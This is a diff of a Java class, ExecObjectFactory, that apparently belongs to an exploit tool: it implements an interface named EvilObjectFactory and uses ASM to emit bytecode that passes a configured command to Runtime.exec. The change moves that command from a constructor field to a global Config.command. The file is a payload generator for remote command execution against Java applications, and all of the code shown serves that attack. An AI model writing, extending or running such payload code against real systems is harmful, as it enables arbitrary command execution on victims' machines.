@@ -1,14 +1,15 @@
 package asm;
 
 import asm.ofi.EvilObjectFactory;
+import cli.Config;
 import jdk.internal.org.objectweb.asm.*;
 
 public class ExecObjectFactory implements EvilObjectFactory, Opcodes {
-    private String command;
-
-    public ExecObjectFactory(String command) {
-        this.command = command;
-    }
+//    private String command;
+//
+//    public ExecObjectFactory(String command) {
+//        this.command = command;
+//    }
 
     @Override
     public byte[] getObjectFactory() {
@@ -57,7 +58,7 @@ public class ExecObjectFactory implements EvilObjectFactory, Opcodes {
             methodVisitor.visitInsn(DUP);
             methodVisitor.visitInsn(ICONST_2);
             // command
-            methodVisitor.visitLdcInsn(this.command);
+            methodVisitor.visitLdcInsn(Config.command);
             methodVisitor.visitInsn(AASTORE);
             methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
             methodVisitor.visitInsn(POP);
